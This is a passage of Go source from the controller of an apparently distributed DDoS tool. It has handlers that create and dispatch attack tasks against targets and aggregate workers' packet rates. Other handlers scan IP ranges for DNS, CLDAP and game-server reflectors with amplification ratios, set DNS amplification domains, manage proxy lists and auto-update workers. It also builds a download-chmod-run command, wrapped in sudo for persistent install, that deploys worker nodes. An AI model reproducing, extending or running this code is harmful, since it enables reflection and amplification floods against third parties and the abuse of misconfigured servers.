		c.mu.Lock()
		c.tasks[taskID] = task
		if req.Priority == 1 {
			// 高优先级：插队到派发队列头部
			c.pendingIDs = append([]string{taskID}, c.pendingIDs...)
		} else {
			c.pendingIDs = append(c.pendingIDs, taskID)
		}
		c.mu.Unlock()

		c.auditAction(r, "task_create", fmt.Sprintf("%s %s duration=%ds threads=%d repeat=%d interval=%ds priority=%d",
			taskID, req.Method, req.Duration, req.Threads, req.RepeatCount, req.RepeatInterval, req.Priority))
		log.Printf("[task] %s created: %s %s", taskID, req.Method, req.Target)
		snapshot := c.getTaskInfo(taskID)
		c.broadcastWS("task_created", snapshot)

		writeJSON(w, snapshot)
		return
	}

	c.mu.RLock()
	list := make([]*TaskInfo, 0, len(c.tasks))
	for _, t := range c.tasks {
		list = append(list, cloneTask(t))
	}
	c.mu.RUnlock()
	writeJSON(w, list)
}

func (c *Ctrl) handleTaskByID(w http.ResponseWriter, r *http.Request) {
	taskID := r.URL.Path[len("/api/tasks/"):]

	if strings.HasSuffix(taskID, "/stop") {
		taskID = taskID[:len(taskID)-5]
		if r.Method != "POST" {
			http.Error(w, `{"error":"POST required"}`, 405)
			return
		}
		c.mu.Lock()
		if task, ok := c.tasks[taskID]; ok {
			// 仅运行/等待中的任务可停止：对已完成/失败/取消中的任务重复
			// stop 会把状态重新拉回 cancelling，走完收尾流程后再次写入
			// 攻击日志，产生同 task_id 的多条重复记录
			switch task.Status {
			case "running", "pending":
				task.Status = "cancelling"
				task.CancellingSince = time.Now()
				c.cancelIDs = append(c.cancelIDs, taskID)
			}
		}
		c.mu.Unlock()
		c.auditAction(r, "task_stop", taskID)
		c.broadcastWS("task_update", c.getTaskInfo(taskID))
		writeJSON(w, map[string]bool{"ok": true})
		return
	}

	if taskID == "" {
		http.Error(w, "missing task id", 400)
		return
	}

	info := c.getTaskInfo(taskID)
	if info == nil {
		http.Error(w, "not found", 404)
		return
	}
	writeJSON(w, info)
}

func (c *Ctrl) handleStats(w http.ResponseWriter, r *http.Request) {
	c.mu.RLock()
	agg := struct {
		TotalPPS      uint64 `json:"total_pps"`
		TotalBPS      uint64 `json:"total_bps"`
		TotalPackets  uint64 `json:"total_packets"`
		TotalBytes    uint64 `json:"total_bytes"`
		TotalErrors   uint64 `json:"total_errors"`
		ActiveWorkers int    `json:"active_workers"`
		ActiveTasks   int    `json:"active_tasks"`
		OnlineNodes   int    `json:"online_nodes"`
	}{}
	for _, t := range c.tasks {
		if t.Status != "running" {
			continue
		}
		agg.ActiveTasks++
		for _, w := range t.Workers {
			agg.TotalPPS += w.CurrentPPS
			agg.TotalBPS += w.CurrentBPS
			agg.TotalPackets += w.PacketsSent
			agg.TotalBytes += w.BytesSent
			agg.TotalErrors += w.Errors
			agg.ActiveWorkers++
		}
	}
	for _, n := range c.nodes {
		if n.Status == "READY" || n.Status == "ATTACKING" {
			agg.OnlineNodes++
		}
	}
	c.mu.RUnlock()
	writeJSON(w, agg)
}

func (c *Ctrl) handleTaskComplete(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, `{"error":"POST required"}`, 405)
		return
	}
	var req struct {
		TaskID   string  `json:"task_id"`
		WorkerID string  `json:"worker_id"`
		Packets  uint64  `json:"packets_sent"`
		Bytes    uint64  `json:"bytes_sent"`
		Errors   uint64  `json:"errors"`
		PPS      uint64  `json:"current_pps"`
		BPS      uint64  `json:"current_bps"`
		Elapsed  float64 `json:"elapsed_seconds"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, map[string]string{"error": "invalid request: " + err.Error()})
		return
	}

	c.mu.Lock()
	task, ok := c.tasks[req.TaskID]
	if !ok {
		c.mu.Unlock()
		writeJSON(w, map[string]string{"error": "task not found"})
		return
	}
	if task.Workers == nil {
		c.mu.Unlock()
		writeJSON(w, map[string]string{"error": "task has no workers"})
		return
	}
	// 与 ReportStats 一致：只接受被真实分派到该任务上的 worker 上报，
	// 阻断持有 token 的节点伪造任意任务完成
	if _, assigned := task.Workers[req.WorkerID]; !assigned {
		c.mu.Unlock()
		writeJSON(w, map[string]string{"error": "worker not assigned to task"})
		return
	}
	// 身份绑定：HTTP 来源 IP 必须与节点注册 IP 一致，防止共享 token 下
	// 伪造其他节点的完成上报（来源 IP 不可得或节点 IP 为空时放行）
	if host, _, err := net.SplitHostPort(r.RemoteAddr); err == nil {
		if n, ok := c.nodes[req.WorkerID]; ok && n.IP != "" && n.IP != host {
			c.mu.Unlock()
			writeJSON(w, map[string]string{"error": "ip mismatch"})
			return
		}
	} else if r.RemoteAddr != "" {
		if n, ok := c.nodes[req.WorkerID]; ok && n.IP != "" && n.IP != r.RemoteAddr {
			c.mu.Unlock()
			writeJSON(w, map[string]string{"error": "ip mismatch"})
			return
		}
	}
	task.Workers[req.WorkerID] = &TaskStats{
		WorkerID:    req.WorkerID,
		PacketsSent: req.Packets,
		BytesSent:   req.Bytes,
		Errors:      req.Errors,
		CurrentPPS:  req.PPS,
		CurrentBPS:  req.BPS,
		Elapsed:     req.Elapsed,
		Finished:    true,
	}
	if task.Status == "cancelling" {
		// 与 ReportStats 一致：取消中的任务以确认方式收尾，
		// 超时重试的取消才能转 pending 重新派发
		if task.CancelAcks == nil {
			task.CancelAcks = make(map[string]bool)
		}
		task.CancelAcks[req.WorkerID] = true
		if c.taskFullyCancelled(task) {
			c.finishCancellingTask(task)
		}
	} else if task.Status == "running" {
		allDone := true
		for _, w := range task.Workers {
			if !w.Finished {
				allDone = false
				break
			}
		}
		if allDone {
			task.Status = "completed"
			task.FinishedAt = time.Now()
			entry := c.buildTaskLog(task)
			go c.logTaskComplete(entry)
			wids := taskWorkerIDs(task)
			c.resetNodeStatusesLocked(wids...)
		}
	}
	c.mu.Unlock()

	if ok {
		c.broadcastWS("task_update", c.getTaskInfo(req.TaskID))
	}
	writeJSON(w, map[string]bool{"ok": true})
}

func (c *Ctrl) handleScan(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, `{"error":"POST required"}`, 405)
		return
	}

	var req struct {
		IP          string `json:"ip"`
		StartIP     string `json:"start_ip"`
		EndIP       string `json:"end_ip"`
		Port        int    `json:"port"`
		Concurrency int    `json:"concurrency"`
		ScanType    string `json:"type"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"invalid request: `+err.Error()+`"}`, 400)
		return
	}

	if req.Port == 0 {
		if req.ScanType == "dns" {
			req.Port = 53
		} else if req.ScanType == "cldap" {
			req.Port = 389
		} else {
			req.Port = 27015
		}
	}
	if req.Concurrency <= 0 || req.Concurrency > 512 {
		req.Concurrency = 50
	}

	isDNS := req.ScanType == "dns"
	isCLDAP := req.ScanType == "cldap"
	var results = make([]attack.ScanResult, 0)

	if req.StartIP != "" && req.EndIP != "" {
		req.StartIP = strings.TrimSpace(req.StartIP)
		req.EndIP = strings.TrimSpace(req.EndIP)

		if attack.RangeSize(req.StartIP, req.EndIP) > 65536 {
			writeJSON(w, map[string]string{"error": "range too large: max 65536 addresses"})
			return
		}

		log.Printf("[scan] range %s-%s:%d type=%s", req.StartIP, req.EndIP, req.Port, req.ScanType)
		// 同步扫描加整体超时 + 客户端断开取消：防止大范围扫描长期挂起 HTTP 连接
		scanCtx, cancel := context.WithTimeout(r.Context(), 3*time.Minute)
		defer cancel()
		if isDNS {
			results = attack.ScanDNSRange(scanCtx, req.StartIP, req.EndIP, req.Port, 3, req.Concurrency)
		} else if isCLDAP {
			results = attack.ScanCLDAPRange(scanCtx, req.StartIP, req.EndIP, req.Port, 3, req.Concurrency)
		} else {
			results = attack.ScanRange(scanCtx, req.StartIP, req.EndIP, req.Port, 3, req.Concurrency)
		}
	} else if req.IP != "" {
		req.IP = strings.TrimSpace(req.IP)
		log.Printf("[scan] single %s:%d type=%s", req.IP, req.Port, req.ScanType)
		var r *attack.ScanResult
		if isDNS {
			r = attack.ScanDNSResolver(req.IP, req.Port, 3*time.Second)
		} else if isCLDAP {
			r = attack.ScanCLDAPResponder(req.IP, req.Port, 3*time.Second)
		} else {
			r = attack.ScanIP(req.IP, req.Port, 3*time.Second)
		}
		if r != nil {
			log.Printf("[scan] found %s:%d - %d bytes", r.IP, r.Port, r.ResponseSize)
			results = []attack.ScanResult{*r}
		} else {
			log.Printf("[scan] no response from %s:%d", req.IP, req.Port)
		}
	} else {
		http.Error(w, `{"error":"specify ip or start_ip+end_ip"}`, 400)
		return
	}

	writeJSON(w, results)
}

func (c *Ctrl) handleProxy(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "GET":
		c.proxyMu.RLock()
		data := c.proxyData
		c.proxyMu.RUnlock()
		w.Header().Set("Content-Type", "text/plain")
		w.Write(data)

	case "PUT", "POST":
		// 上限 4MB：代理文件远超此量即为异常请求
		data, err := io.ReadAll(io.LimitReader(r.Body, 4<<20))
		if err != nil {
			http.Error(w, err.Error(), 400)
			return
		}
		if len(data) >= 4<<20 {
			http.Error(w, `{"error":"body too large (max 4MB)"}`, 413)
			return
		}
		c.proxyMu.Lock()
		c.proxyData = data
		c.proxyMu.Unlock()

		if err := os.WriteFile(c.proxyFile, data, 0644); err != nil {
			http.Error(w, err.Error(), 500)
			return
		}

		log.Printf("[proxy] updated (%d bytes)", len(data))
		attack.LoadProxiesFromData(data)
		c.auditAction(r, "proxy_update", fmt.Sprintf("%d bytes", len(data)))
		writeJSON(w, map[string]interface{}{"ok": true, "size": len(data)})

	default:
		http.Error(w, `{"error":"method not allowed"}`, 405)
	}
}

// handleDeployConfig GET/PUT /api/deploy/config
// 快速上线配置：云存储 URL（worker 二进制的直链），Web UI 据此拼接部署命令
func (c *Ctrl) handleDeployConfig(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "GET":
		c.deployMu.RLock()
		url := c.deployStorageURL
		c.deployMu.RUnlock()
		writeJSON(w, map[string]interface{}{"storage_url": url})

	case "PUT", "POST":
		var body struct {
			StorageURL string `json:"storage_url"`
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			http.Error(w, `{"error":"invalid json"}`, 400)
			return
		}
		url := strings.TrimSpace(body.StorageURL)
		if url != "" && !strings.HasPrefix(url, "http://") && !strings.HasPrefix(url, "https://") {
			writeJSON(w, map[string]interface{}{"error": "storage URL must start with http:// or https://"})
			return
		}

		c.deployMu.Lock()
		c.deployStorageURL = url
		c.deployMu.Unlock()

		if err := os.WriteFile(c.deployFile, []byte(url), 0644); err != nil {
			http.Error(w, err.Error(), 500)
			return
		}
		log.Printf("[deploy] storage URL updated: %s", url)
		c.auditAction(r, "deploy_config", url)
		writeJSON(w, map[string]interface{}{"ok": true, "storage_url": url})

	default:
		http.Error(w, `{"error":"method not allowed"}`, 405)
	}
}

// handleDeployCommand GET /api/deploy/command?proxy=1&install=1&daemon=1
// 全自动拼接：公网 IP 自动探测 + gRPC/HTTP 端口从监听地址推导 + token 从
// data/auth/worker.token 读取（New 时 loadOrGenerate）。可选覆盖：
// addr（手动指定 controller 地址）、grpc_port、http_port。
func (c *Ctrl) handleDeployCommand(w http.ResponseWriter, r *http.Request) {
	c.deployMu.RLock()
	storageURL := c.deployStorageURL
	c.deployMu.RUnlock()

	if storageURL == "" {
		// 未配置云存储：回退默认 GitHub Release 地址（基于编译注入的仓库，
		// 版本 = Controller 当前构建版本，与 worker 对齐）。
		// 避免旧配置残留旧仓库名（如改名前的 newtool）导致 404。
		if c.build.GitRepo != "" && c.build.Version != "" && c.build.Version != "dev" {
			storageURL = c.defaultUpdateURL(c.build.Version, false)
		} else {
			writeJSON(w, map[string]interface{}{"error": "storage URL not configured", "command": ""})
			return
		}
	}

	// gRPC 端口：优先查询参数，否则从监听地址推导
	grpcPort := strings.TrimSpace(r.URL.Query().Get("grpc_port"))
	if grpcPort == "" {
		_, p, err := net.SplitHostPort(c.grpcAddr)
		if err == nil && p != "" {
			grpcPort = p
		} else {
			grpcPort = "9090"
		}
	}
	if n, err := strconv.Atoi(grpcPort); err != nil || n < 1 || n > 65535 {
		writeJSON(w, map[string]interface{}{"error": "invalid grpc_port"})
		return
	}

	// http_port 用于 Worker 的 HTTP 回连端口（dashboard/API）：
	// 非默认 8080 时必须传给 worker，否则代理/DNS/反射器拉取连错端口。
	httpPort := strings.TrimSpace(r.URL.Query().Get("http_port"))
	if httpPort == "" {
		_, p, err := net.SplitHostPort(c.httpAddr)
		if err == nil && p != "" {
			httpPort = p
		} else {
			httpPort = "8080"
		}
	}
	if n, err := strconv.Atoi(httpPort); err != nil || n < 1 || n > 65535 {
		writeJSON(w, map[string]interface{}{"error": "invalid http_port"})
		return
	}

	// addr：手动指定优先；否则自动探测公网 IP 拼接 gRPC 端口。
	// 探测失败时回退 localhost（Worker 与 Controller 同机部署仍可用）。
	addr := strings.TrimSpace(r.URL.Query().Get("addr"))
	if addr != "" {
		host, portStr, err := net.SplitHostPort(addr)
		if err != nil || host == "" {
			writeJSON(w, map[string]interface{}{"error": "invalid addr, must be host:port"})
			return
		}
		if n, err := strconv.Atoi(portStr); err != nil || n < 1 || n > 65535 {
			writeJSON(w, map[string]interface{}{"error": "invalid addr port"})
			return
		}
	} else {
		if pub := c.getPublicIP(); pub != "" {
			addr = net.JoinHostPort(pub, grpcPort)
		} else {
			addr = "localhost:" + grpcPort
		}
	}

	// -install 与 -daemon 互斥（worker main.go 中 install 优先，daemon 会被静默忽略）
	if r.URL.Query().Get("install") == "1" && r.URL.Query().Get("daemon") == "1" {
		writeJSON(w, map[string]interface{}{"error": "install and daemon are mutually exclusive"})
		return
	}

	// token 来自 data/auth/worker.token（New 时 loadOrGenerate 读取）
	workerCmd := "./worker -c " + addr + " -token " + c.workerToken
	if httpPort != "8080" {
		workerCmd += " -http-port " + httpPort
	}
	if r.URL.Query().Get("proxy") == "1" {
		workerCmd += " -proxy"
	}
	if r.URL.Query().Get("install") == "1" {
		workerCmd += " -install"
	}
	if r.URL.Query().Get("daemon") == "1" {
		workerCmd += " -daemon"
	}

	// 下载工具：curl（默认）或 wget，前端可切换
	download := "curl -fsSL \"" + storageURL + "\" -o worker"
	if r.URL.Query().Get("tool") == "wget" {
		download = "wget -q -O worker \"" + storageURL + "\""
	}

	parts := []string{
		download,
		"chmod +x worker",
		workerCmd,
	}
	command := strings.Join(parts, " && ")

	// -install 需要 root 写入 /etc/systemd 或注册 schtasks：
	// 普通用户直接执行会因权限失败，用 sudo bash -c 包装整条命令链。
	// 用单引号包裹：内部 URL 的双引号无需转义，命令干净可读
	// （token/URL 为 hex 无单引号；万一含单引号用 '\'' 转义兜底）。
	if r.URL.Query().Get("install") == "1" {
		command = "sudo bash -c '" + strings.ReplaceAll(command, "'", "'\\''") + "'"
	}

	writeJSON(w, map[string]interface{}{
		"command":  command,
		"addr":     addr,
		"httpPort": httpPort,
	})
}

// handleDeployUpdate PUT /api/deploy/update
// 配置云更新目标。语义：
//   - {"version":"","url":""}（或省略字段）→ 默认目标：version=Controller 构建版本，
//     url=GitHub Release 默认地址（gitRepo + 版本 + Worker 平台二进制）
//   - {"version":"v1.0.5","url":""} → 指定版本 + 默认 GitHub 地址
//   - {"version":"v9.9.9","url":"https://..."} → 自定义版本 + 自定义直链
//   - {"clear":true} → 显式清除更新配置
//
// 持久化到 data/deploy_update.json，所有 Worker 在 60s 内轮询到并自动更新重启。
func (c *Ctrl) handleDeployUpdate(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "PUT", "POST":
		var req struct {
			Version *string `json:"version"`
			URL     *string `json:"url"`
			// SHA256 仅对自定义 URL 有意义（默认 GitHub 路径自动从 API 拉取）
			SHA256 *string `json:"sha256"`
			Clear  bool    `json:"clear"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, `{"error":"invalid json"}`, 400)
			return
		}

		// 显式清除
		if req.Clear {
			c.updateMu.Lock()
			c.updateVersion = ""
			c.updateURL = ""
			c.updateSHA256Linux = ""
			c.updateSHA256Windows = ""
			c.updateMu.Unlock()
			payload, _ := json.Marshal(map[string]string{"version": "", "url": "", "sha256_linux": "", "sha256_windows": ""})
			os.WriteFile(c.updateFile, payload, 0644)
			log.Printf("[update] update config cleared")
			c.auditAction(r, "deploy_update_clear", "")
			writeJSON(w, map[string]interface{}{"ok": true, "version": "", "cleared": true})
			return
		}

		// 留空 = 默认跟随 Controller 构建版本（与 Worker 版本对齐）
		version := c.build.Version
		if req.Version != nil {
			version = strings.TrimSpace(*req.Version)
		}
		url := ""
		if req.URL != nil {
			url = strings.TrimSpace(*req.URL)
		}

		if version == "" {
			writeJSON(w, map[string]interface{}{"error": "version is required (Controller build version not set)"})
			return
		}
		if url != "" && !strings.HasPrefix(url, "http://") && !strings.HasPrefix(url, "https://") {
			writeJSON(w, map[string]interface{}{"error": "url must start with http:// or https://"})
			return
		}

		// SHA-256 供应链校验（见 handleDeployVersion 的 require_sha256）：
		// 默认 GitHub 路径自动从 Release API 拉取双平台 asset digest；
		// 自定义 URL 时由管理员显式提供（否则 Worker 跳过 digest 校验）。
		sha256linux, sha256windows := "", ""
		if url == "" {
			if c.build.GitRepo != "" {
				sha256linux = c.fetchAssetSHA256(version, "worker-linux-amd64")
				sha256windows = c.fetchAssetSHA256(version, "worker-windows-amd64.exe")
				if sha256linux == "" && sha256windows == "" {
					log.Printf("[update] WARNING: failed to fetch asset SHA-256 for %s — workers will REJECT this update (supply-chain protection)", version)
				}
			}
		} else if req.SHA256 != nil {
			sha256linux = strings.TrimSpace(*req.SHA256)
			sha256windows = sha256linux
		}

		c.updateMu.Lock()
		c.updateVersion = version
		c.updateURL = url
		c.updateSHA256Linux = sha256linux
		c.updateSHA256Windows = sha256windows
		c.updateMu.Unlock()

		// 持久化
		payload, _ := json.Marshal(map[string]string{"version": version, "url": url, "sha256_linux": sha256linux, "sha256_windows": sha256windows})
		if err := os.WriteFile(c.updateFile, payload, 0644); err != nil {
			http.Error(w, err.Error(), 500)
			return
		}

		if url != "" {
			log.Printf("[update] target version %s (custom url), all workers will update within ~60s", version)
		} else if c.build.GitRepo != "" {
			log.Printf("[update] target version %s (default github release), all workers will update within ~60s", version)
		} else {
			log.Printf("[update] target version %s set but no git repo / custom url - workers have no download source", version)
		}
		c.auditAction(r, "deploy_update_set", version)
		writeJSON(w, map[string]interface{}{"ok": true, "version": version})

	case "GET":
		c.updateMu.RLock()
		v, u := c.updateVersion, c.updateURL
		c.updateMu.RUnlock()
		writeJSON(w, map[string]interface{}{"version": v, "url": u})

	default:
		http.Error(w, `{"error":"method not allowed"}`, 405)
	}
}

// handleDeployVersion GET /api/deploy/version
// Worker 轮询端点：返回目标版本与下载 URL（worker token 可访问）。
// URL 未配置时按请求方平台返回默认 GitHub Release 地址。
func (c *Ctrl) handleDeployVersion(w http.ResponseWriter, r *http.Request) {
	c.updateMu.RLock()
	v, u := c.updateVersion, c.updateURL
	sha256linux, sha256windows := c.updateSHA256Linux, c.updateSHA256Windows
	c.updateMu.RUnlock()

	// 自定义 URL 或未配置：直接返回。
	// require_sha256=false 表示自定义 URL（管理员显式配置的下载源），
	// Worker 不做 digest 校验（无自动获取渠道）。
	if u != "" || v == "" {
		writeJSON(w, map[string]interface{}{"version": v, "url": u, "sha256": "", "require_sha256": false})
		return
	}

	// 默认 GitHub Release：按 Worker 平台选择二进制
	isWindows := false
	if wid := r.URL.Query().Get("worker_id"); wid != "" {
		c.mu.RLock()
		if n, ok := c.nodes[wid]; ok {
			isWindows = n.IsWindows
		}
		c.mu.RUnlock()
	}
	sha := sha256linux
	if isWindows {
		sha = sha256windows
	}
	// require_sha256=true：Worker 必须校验 digest，缺失即拒绝更新
	// （供应链保护，防止 ghproxy/中间人注入任意可执行文件）
	writeJSON(w, map[string]interface{}{"version": v, "url": c.defaultUpdateURL(v, isWindows), "sha256": sha, "require_sha256": true})
}

// getPublicIP 探测 Controller 公网 IP（缓存 1 小时）。
// 兼容纯文本 IP（iplark.com / ipify）与 JSON 格式（api.ip.cc）。
func (c *Ctrl) getPublicIP() string {
	c.publicIPCache.RLock()
	if c.publicIP != "" && time.Since(c.publicIPAt) < time.Hour {
		ip := c.publicIP
		c.publicIPCache.RUnlock()
		return ip
	}
	c.publicIPCache.RUnlock()

	client := &http.Client{Timeout: 3 * time.Second}
	var jsonResp struct {
		IP string `json:"ip"`
	}
	for _, u := range []string{"https://iplark.com", "https://api.ipify.org", "https://api.ip.cc/"} {
		req, err := http.NewRequest("GET", u, nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024))
		resp.Body.Close()
		raw := strings.TrimSpace(string(body))
		if raw == "" {
			continue
		}
		var ip string
		if net.ParseIP(raw) != nil {
			ip = raw
		} else if json.Unmarshal(body, &jsonResp) == nil && net.ParseIP(jsonResp.IP) != nil {
			ip = jsonResp.IP
		}
		if ip != "" {
			c.publicIPCache.Lock()
			c.publicIP = ip
			c.publicIPAt = time.Now()
			c.publicIPCache.Unlock()
			return ip
		}
	}
	return ""
}

func (c *Ctrl) handleDNSAmp(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "GET":
		c.dnsAmpMu.RLock()
		domain := c.dnsAmpDomain
		c.dnsAmpMu.RUnlock()
		domains := attack.GetAmpDomains()
		writeJSON(w, map[string]interface{}{"domain": domain, "domains": domains})

	case "PUT", "POST":
		var body struct {
			Domain string `json:"domain"`
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			http.Error(w, `{"error":"invalid json"}`, 400)
			return
		}
		domain := strings.TrimSpace(body.Domain)

		if domain == c.dnsAmpDomain {
			writeJSON(w, map[string]interface{}{"ok": true, "domain": domain})
			return
		}

		c.dnsAmpMu.Lock()
		c.dnsAmpDomain = domain
		c.dnsAmpMu.Unlock()

		if err := os.WriteFile(c.dnsAmpFile, []byte(domain), 0644); err != nil {
			http.Error(w, err.Error(), 500)
			return
		}

		attack.SetAmpDomain(domain)
		log.Printf("[dns] amp domain updated: %s", domain)

		go func() {
			pool := reflector.GetPool("dns")
			if pool != nil {
				c.testGamePool(nil, "dns", pool)
			}
		}()

		writeJSON(w, map[string]interface{}{"ok": true, "domain": domain})

	default:
		http.Error(w, `{"error":"method not allowed"}`, 405)
	}
}

func (c *Ctrl) handleDNSAmpDomains(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "GET":
		domains := attack.GetAmpDomains()
		c.dnsAmpMu.RLock()
		customDomain := c.dnsAmpDomain
		c.dnsAmpMu.RUnlock()
		writeJSON(w, map[string]interface{}{
			"domains":       domains,
			"custom_domain": customDomain,
		})

	case "PUT", "POST":
		var body struct {
			Domains []string `json:"domains"`
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			http.Error(w, `{"error":"invalid json"}`, 400)
			return
		}

		var lines []string
		for _, d := range body.Domains {
			d = strings.TrimSpace(d)
			if d != "" {
				lines = append(lines, d)
			}
		}

		content := strings.Join(lines, "\n") + "\n"
		if err := os.WriteFile(c.dnsAmpDomainsFile, []byte(content), 0644); err != nil {
			http.Error(w, err.Error(), 500)
			return
		}

		attack.SetDomainsExplicit(lines)
		log.Printf("[dns] amp domains updated: %d domains", len(lines))
		writeJSON(w, map[string]interface{}{"ok": true, "count": len(lines)})

	default:
		http.Error(w, `{"error":"method not allowed"}`, 405)
	}
}

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

func (c *Ctrl) handleWS(w http.ResponseWriter, r *http.Request) {
	token := r.URL.Query().Get("token")
	if token != c.adminToken && token != c.workerToken {
		http.Error(w, "unauthorized", 401)
		return
	}

	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("WS upgrade: %v", err)
		return
	}

	client := &WSClient{conn: conn, sendCh: make(chan []byte, 64)}

	c.wsMu.Lock()
	c.wsClients[client] = true
	c.wsMu.Unlock()

	c.mu.RLock()
	nodes := c.listNodesLocked()
	c.mu.RUnlock()
	data, _ := json.Marshal(map[string]interface{}{"type": "nodes", "data": nodes})
	client.enqueue(data)

	// 读循环：客户端断开/超时 → 移除客户端。
	// 设读超时防静默断连（无 FIN）永久泄漏 goroutine + fd。
	go func() {
		for {
			conn.SetReadDeadline(time.Now().Add(90 * time.Second))
			_, _, err := conn.ReadMessage()
			if err != nil {
				c.removeWSClient(client)
				return
			}
		}
	}()

	// 写循环：独占串行写，慢消费者不阻塞 broadcast 调用方
	go client.writeLoop(c)
}

// removeWSClient 从客户端表移除并关闭连接（幂等）。
// 读/写循环任一失败都会调用，map 存在性检查保证只清理一次。
func (c *Ctrl) removeWSClient(cl *WSClient) {
	c.wsMu.Lock()
	if _, ok := c.wsClients[cl]; ok {
		delete(c.wsClients, cl)
		cl.conn.Close()
	}
	c.wsMu.Unlock()
}

func (cl *WSClient) writeLoop(c *Ctrl) {
	for msg := range cl.sendCh {
		cl.conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		if err := cl.conn.WriteMessage(websocket.TextMessage, msg); err != nil {
			c.removeWSClient(cl)
			return
		}
	}
}

// enqueue 非阻塞入队；缓冲满时丢弃（广播类消息允许丢，绝不阻塞调用方）。
func (cl *WSClient) enqueue(data []byte) {
	select {
	case cl.sendCh <- data:
	default:
	}
}

// broadcastWS 向所有客户端广播消息（非阻塞：只做 JSON 序列化 + 通道入队，
// 心跳处理路径上的调用不再被慢 WS 客户端拖住）。
func (c *Ctrl) broadcastWS(msgType string, data interface{}) {
	msg, err := json.Marshal(map[string]interface{}{"type": msgType, "data": data})
	if err != nil {
		return
	}
	c.wsMu.RLock()
	for client := range c.wsClients {
		client.enqueue(msg)
	}
	c.wsMu.RUnlock()
}

func writeJSON(w http.ResponseWriter, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(v)
}

func (c *Ctrl) handlePools(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, reflector.GetPoolInfo())
}

// handlePoolStats GET /api/pools/stats — 池健康仪表盘数据
func (c *Ctrl) handlePoolStats(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, reflector.GetPoolHealth())
}

func (c *Ctrl) handlePoolByGame(w http.ResponseWriter, r *http.Request) {
	path := strings.TrimPrefix(r.URL.Path, "/api/pools/")
	parts := strings.SplitN(path, "/", 2)
	gameID := parts[0]
	action := ""
	if len(parts) > 1 {
		action = parts[1]
	}

	pool := reflector.GetPool(gameID)
	if pool == nil {
		writeJSON(w, map[string]string{"error": "unknown game pool: " + gameID})
		return
	}

	switch {
	case action == "refresh":
		if r.Method != "POST" {
			http.Error(w, `{"error":"POST required"}`, 405)
			return
		}
		c.refreshGamePool(w, r, gameID, pool)
	case action == "add":
		if r.Method != "POST" {
			http.Error(w, `{"error":"POST required"}`, 405)
			return
		}
		c.addToGamePool(w, r, gameID, pool)
	case action == "test":
		if r.Method != "POST" {
			http.Error(w, `{"error":"POST required"}`, 405)
			return
		}
		c.testGamePool(w, gameID, pool)
	case action == "test-single" && gameID == "dns":
		c.testSingleDNSReflector(w, r)
	case action == "test-single" && gameID == "cldap":
		c.testSingleCLDAPReflector(w, r)
	default:
		switch r.Method {
		case "GET":
			writeJSON(w, pool.List())
		case "DELETE":
			ip := r.URL.Query().Get("ip")
			port := 0
			fmt.Sscanf(r.URL.Query().Get("port"), "%d", &port)
			pool.Remove(ip, port)
			writeJSON(w, map[string]interface{}{"ok": true})
		default:
			writeJSON(w, map[string]string{"error": "method not allowed"})
		}
	}
}

// maxManualAddEntries 单次批量添加反射器条目的上限
// （每条目同步扫描 3s、200 并发，无上限会挂起请求数小时）
const maxManualAddEntries = 2000

func (c *Ctrl) addToGamePool(w http.ResponseWriter, r *http.Request, gameID string, pool *reflector.Pool) {
	var targets []string
	if err := json.NewDecoder(r.Body).Decode(&targets); err != nil {
		writeJSON(w, map[string]string{"error": err.Error()})
		return
	}
	// 批量上限：每条目同步扫描 3s（200 并发），无上限会让
	// 数万条目的请求挂起数小时并阻塞连接
	if len(targets) > maxManualAddEntries {
		writeJSON(w, map[string]string{"error": fmt.Sprintf("too many entries: max %d per request", maxManualAddEntries)})
		return
	}
	added := c.addReflectorsToPool(gameID, pool, targets)

	log.Printf("[pool] %s: added %d manual entries", gameID, added)
	writeJSON(w, map[string]interface{}{"ok": true, "added": added, "total": pool.Count()})
}

// addReflectorsToPool 扫描并添加手动条目到池（other 池自动按游戏分类）。
// 返回成功添加的数量。
func (c *Ctrl) addReflectorsToPool(gameID string, pool *reflector.Pool, targets []string) int {
	added := 0
	now := time.Now().Unix()
	isDNS := gameID == "dns"
	isCLDAP := gameID == "cldap"
	for _, t := range targets {
		t = strings.TrimSpace(t)
		if t == "" {
			continue
		}
		ip, port := attack.SplitTarget(t)
		if port == 0 {
			if isDNS {
				port = 53
			} else if isCLDAP {
				port = 389
			} else {
				port = 27015
			}
		}

		var result *attack.ScanResult
		if isDNS {
			result = attack.ScanDNSResolver(ip, port, 3*time.Second)
		} else if isCLDAP {
			result = attack.ScanCLDAPResponder(ip, port, 3*time.Second)
		} else {
			result = attack.ScanIP(ip, port, 3*time.Second)
		}
		if result == nil {
			continue
		}

		ref := reflector.Reflector{
			IP: result.IP, Port: result.Port,
			ResponseSize: result.ResponseSize,
			ServerName:   result.ServerName,
			Game:         result.Game,
			Source:       "manual",
			AddedAt:      now,
			HasChallenge: result.HasChallenge,
			SuccessCount: 1,
			LastTested:   now,
			LastValid:    true,
			AmpDomain:    result.BestDomain,
			AmpRatio:     result.AmpRatio,
		}

		targetPool := pool
		if gameID == "other" {
			for _, g := range reflector.Games {
				if g.AppID == 0 {
					continue
				}
